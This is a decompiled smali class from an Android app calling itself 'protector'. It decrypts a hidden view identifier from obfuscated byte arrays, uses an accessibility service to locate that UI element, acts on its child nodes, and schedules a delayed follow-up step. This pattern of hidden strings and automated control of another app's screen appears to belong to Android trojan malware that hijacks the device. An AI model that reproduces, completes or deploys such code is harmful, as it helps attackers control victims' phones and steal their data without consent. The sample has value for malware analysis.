.class Lcom/icontrol/protector/m$c$a$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Lcom/icontrol/protector/w$c;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/m$c$a;->a()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/icontrol/protector/m$c$a;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/m$c$a;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/m$c$a$a;->a:Lcom/icontrol/protector/m$c$a;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic c()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/icontrol/protector/m$c$a$a;->d()V

    return-void
.end method

.method private static synthetic d()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/icontrol/protector/m;->c0()V

    return-void
.end method


# virtual methods
.method public a()V
    .locals 4

    .line 1
    const/16 v0, 0x5dc

    invoke-static {v0}, Lcom/icontrol/protector/m;->a0(I)V

    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/16 v1, 0x28

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    const/4 v2, 0x1

    if-le v1, v2, :cond_1

    const/4 v1, 0x3

    :goto_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    if-ge v1, v2, :cond_0

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-static {v2}, Lcom/icontrol/protector/m;->l0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {}, Lcom/icontrol/protector/m;->b0()V

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/icontrol/protector/o;

    invoke-direct {v1}, Lcom/icontrol/protector/o;-><init>()V

    const-wide/16 v2, 0xdac

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_1
    return-void

    :array_0
    .array-data 1
        0x31t
        -0x34t
        0x22t
        -0x46t
        0x52t
        0x2et
        -0x53t
        0x3t
        0x7ct
        -0x30t
        0x2at
        -0x9t
        0x4at
        0x35t
        -0x4ft
        0x1et
        0x2bt
        -0x40t
        0x2at
        -0x6t
        0x4bt
        0x22t
        -0x56t
        0x50t
        0x3bt
        -0x39t
        0x60t
        -0x1at
        0x5at
        0x24t
        -0x5ft
        0x9t
        0x3et
        -0x3at
        0x3dt
        -0x35t
        0x49t
        0x2et
        -0x43t
        0x1dt
    .end array-data

    :array_1
    .array-data 1
        0x52t
        -0x5dt
        0x4ft
        -0x6ct
        0x3ft
        0x47t
        -0x28t
        0x6at
    .end array-data
.end method

.method public b()V
    .locals 0

    .line 1
    return-void
.end method
